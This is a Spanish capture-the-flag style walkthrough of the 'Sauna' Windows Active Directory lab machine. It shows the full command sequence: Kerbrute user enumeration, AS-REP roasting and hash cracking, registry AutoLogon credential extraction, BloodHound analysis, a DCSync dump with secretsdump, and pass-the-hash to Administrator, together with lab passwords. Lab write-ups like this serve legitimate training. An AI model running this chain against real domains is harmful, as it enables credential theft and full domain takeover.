# Sauna

![](../../../../~gitbook/image.md)Publicado: 20 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
OS: Windows
### 📝 Descripción
Sauna es una máquina Windows de dificultad fácil que simula un entorno de Active Directory corporativo. La máquina presenta un sitio web de un banco ficticio que revela información sobre empleados, lo que permite la enumeración de usuarios válidos del dominio. La explotación inicial se logra mediante AS-REP Roasting contra un usuario sin pre-autenticación Kerberos habilitada. La escalada de privilegios se realiza a través del descubrimiento de credenciales hardcodeadas en el registro de Windows y culmina con un ataque DCSync para obtener acceso administrativo completo.
### 🎯 Puntos Clave
- Reconocimiento web: Extracción de nombres de empleados del sitio web corporativo
- Generación de usernames: Uso de username-anarchy para crear listas de usuarios potenciales
- Enumeración de usuarios: Kerbrute para validar usuarios en el dominio
- AS-REP Roasting: Explotación de usuarios sin pre-autenticación Kerberos
- Credenciales en registro: Descubrimiento de credenciales de AutoLogon
- Análisis con BloodHound: Identificación de privilegios DCSync
- DCSync Attack: Volcado completo de hashes del dominio

### 🔭 Reconocimiento

#### 🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
#### 🚀 Escaneo de puertos

#### 🔍 Enumeración de servicios
⚠️ Añadimos el siguiente vhost a nuestro fichero /etc/hosts:
#### 📋 Análisis de Servicios Detectados
- Puerto 53 (DNS): Servidor DNS del dominio
- Puerto 80 (HTTP): Sitio web corporativo del banco
- Puerto 88 (Kerberos): Servicio de autenticación del dominio
- Puerto 389/636 (LDAP/LDAPS): Servicios de directorio
- Puerto 445 (SMB): Compartición de archivos
- Puerto 5985 (WinRM): Administración remota de Windows
- Puertos RPC varios: Servicios de llamadas remotas

### 🌐 Enumeración de Servicios

#### 🗂️ Puerto 445 - SMB
Dado que no tenemos credenciales, intentamos enumeración con sesión nula pero no obtenemos información útil:
#### 🌐 Puerto 80 - HTTP (Egotistical Bank)
Al acceder al sitio web encontramos una página corporativa del banco ficticio "Egotistical Bank":![](../../../../~gitbook/image.md)🔍 Fuzzing de directorios👥 Extracción de nombres de empleadosEn la página `/about.html` encontramos información valiosa sobre los empleados del banco:![](../../../../~gitbook/image.md)- Fergus Smith - Senior Manager
- Shaun Coins - Marketing Manager
- Sophie Driver - Account Manager
- Bowie Taylor - HR Manager
- Hugo Bear - CEO
- Steven Kerb - Software Engineer
Creamos una lista con estos nombres para generar posibles usernames:
### 🎯 Explotación Inicial

#### 👤 Generación de Usernames
Utilizamos `username-anarchy` para generar diferentes combinaciones de nombres de usuario:Esto genera combinaciones como:- fergus, fsmith, fergus.smith, ferguss
- shaun, scoins, shaun.coins, shauns
- sophie, sdriver, sophie.driver, sophied
- etc.
![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
#### 🔐 Enumeración de usuarios con Kerbrute
Usamos la herramienta `kerbrute` para tratar de enumerar usuarios válidos en el dominio¡Excelente! Encontramos un usuario válido: fsmith (Fergus Smith)
#### 🎫 AS-REP Roasting
Verificamos si el usuario `fsmith` tiene la pre-autenticación de Kerberos deshabilitada:¡Perfecto! El usuario tiene AS-REP Roasting habilitado. Guardamos el hash para crackearlo.![](../../../../~gitbook/image.md)
#### 🔨 Cracking del hash
![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)¡Credenciales obtenidas!- Usuario: `fsmith`
- Contraseña: `Thestrokes23`

#### ✅ Verificación de acceso
![](../../../../~gitbook/image.md)
### 🚪 Acceso Inicial

#### 💻 Conexión vía WinRM

#### 🏃‍♂️ Captura de User Flag

### 🔝 Escalada de Privilegios

#### 🔍 Enumeración del sistema
🗝️ Descubrimiento de credenciales en el registroRealizamos enumeración básica del sistema en busca de vectores de escalada y encontramos credenciales almacenadas en el registro de Windows:¡Nueva credencial encontrada!- Usuario: `svc_loanmgr` (svc_loanmanager)
- Contraseña: `Moneymakestheworldgoround!`
![](../../../../~gitbook/image.md)
#### 🔄 Movimiento lateral
Verificamos si esta nueva cuenta tiene acceso WinRM:![](../../../../~gitbook/image.md)Nos conectamos con la nueva cuenta:
#### 🩸 Análisis con BloodHound
Para analizar mejor los privilegios y relaciones en el dominio, utilizamos SharpHound:
#### 📊 Análisis de privilegios
Una vez cargamos los datos en BloodHound y marcamos `svc_loanmgr` como "Owned", descubrimos que este usuario tiene privilegios especiales:![](../../../../~gitbook/image.md)- GetChanges: Permite leer cambios en el directorio
- GetChangesAll: Permite leer todos los cambios, incluyendo secretos
Estos privilegios nos permiten realizar un ataque DCSync para volcar todos los hashes del dominio.
#### 💀 Ataque DCSync
¡Hash del Administrador obtenido!- Hash NTLM: `<REDACTED>`

### 👑 Acceso como Administrador

#### 🔐 Pass The Hash
Utilizamos el hash NTLM del administrador para obtener acceso completo:
#### 🏁 Captura de Root Flag

- [🎯 Puntos Clave](#puntos-clave)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración de Servicios](#enumeracion-de-servicios-1)
- [🎯 Explotación Inicial](#explotacion-inicial)
- [🚪 Acceso Inicial](#acceso-inicial)
- [🔝 Escalada de Privilegios](#escalada-de-privilegios)
- [👑 Acceso como Administrador](#acceso-como-administrador)

```
❯ ping -c2 10.10.10.175
PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data.
64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=46.6 ms
64 bytes from 10.10.10.175: icmp_seq=2 ttl=127 time=47.7 ms

--- 10.10.10.175 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 46.611/47.153/47.695/0.542 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.175 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49677,49689,49697
```

```
nmap -sC -sV -p$ports 10.10.10.175 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 18:22 CEST
Nmap scan report for 10.10.10.175
Host is up (0.051s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-20 23:22:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-06-20T23:23:14
|_  start_date: N/A
```

```
echo "10.10.10.175 EGOTISTICAL-BANK.LOCAL" | sudo tee -a /etc/hosts
```

```
smbclient -N -L //10.10.10.175
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
enum4linux 10.10.10.175
# No devuelve información útil debido a restricciones de acceso
```

```
netexec ldap 10.10.10.175 -u '' -p '' --users
LDAP        10.10.10.175    389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
LDAP        10.10.10.175    389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\:
LDAP        10.10.10.175    389    SAUNA            [*] Enumerated 0 domain users: EGOTISTICAL-BANK.LOCAL
```

```
dirsearch -u http://10.10.10.175 -x 503,404,403

_|. _ _  _  _  _ _|_    v0.4.3
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://10.10.10.175/

[18:29:49] Scanning:
[18:29:55] 200 -   30KB - /about.html
[18:30:03] 200 -   15KB - /contact.html
[18:30:03] 301 -   147B - /css  ->  http://10.10.10.175/css/
[18:30:05] 301 -   149B - /fonts  ->  http://10.10.10.175/fonts/
[18:30:07] 301 -   150B - /images  ->  http://10.10.10.175/images/
[18:30:07] 200 -   32KB - /index.html
```

```
# users.txt
Fergus Smith
Shaun Coins
Sophie Driver
Bowie Taylor
Hugo Bear
Steven Kerb
```

```
username-anarchy --input-file users.txt --select-format first,flast,first.last,firstl > unames.txt
```

```
kerbrute userenum -d egotistical-bank.local --dc 10.10.10.175 unames.txt

__             __               __
/ /_____  _____/ /_  _______  __/ /____
/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
/ ,  Using KDC(s):
2025/06/20 18:47:09 >  	10.10.10.175:88

2025/06/20 18:47:09 >  [+] VALID USERNAME:	fsmith@egotistical-bank.local
2025/06/20 18:47:09 >  Done! Tested 24 usernames (1 valid) in 0.149 seconds
```

```
impacket-GetNPUsers egotistical-bank.local/fsmith -no-pass -dc-ip 10.10.10.175
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a324[...hash...]
```

```
hashcat -m 18200 -a 0 fsmith_hash /usr/share/wordlists/rockyou.txt
# Resultado: Thestrokes23
```

```
netexec winrm 10.10.10.175 -u fsmith -p Thestrokes23
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Authenticathed!)
```

```
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
```

```
*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir

Directory: C:\Users\FSmith\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/20/2025   4:19 PM             34 user.txt

*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
[USER_FLAG_HERE]
```

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
AutoAdminLogon    REG_SZ    1
DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
DefaultPassword    REG_SZ    Moneymakestheworldgoround!
DefaultDomainName    REG_SZ    EGOTISTICALBANK
```

```
netexec winrm 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Authenticathed!)
```

```
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
egotisticalbank\svc_loanmgr
```

```
# Subimos SharpHound
*Evil-WinRM* PS C:\Temp> upload SharpHound.exe

# Ejecutamos la recolección de datos
*Evil-WinRM* PS C:\Temp> .\SharpHound.exe -c All --zipfilename SAUNA

# Descargamos los resultados
*Evil-WinRM* PS C:\Temp> download 20250620170139_SAUNA.zip
```

```
impacket-secretsdump egotistical-bank.local/svc_loanmgr@10.10.10.175
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password: [Moneymakestheworldgoround!]
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee::::
Guest:501:aad3b435b51404eeaad3b435b51404ee::::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee::::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee::::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee::::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee::::
[*] Cleaning up...
```

```
evil-winrm -i 10.10.10.175 -u Administrator -H

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotisticalbank\administrator
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/20/2025   4:19 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
[ROOT_FLAG_HERE]
```
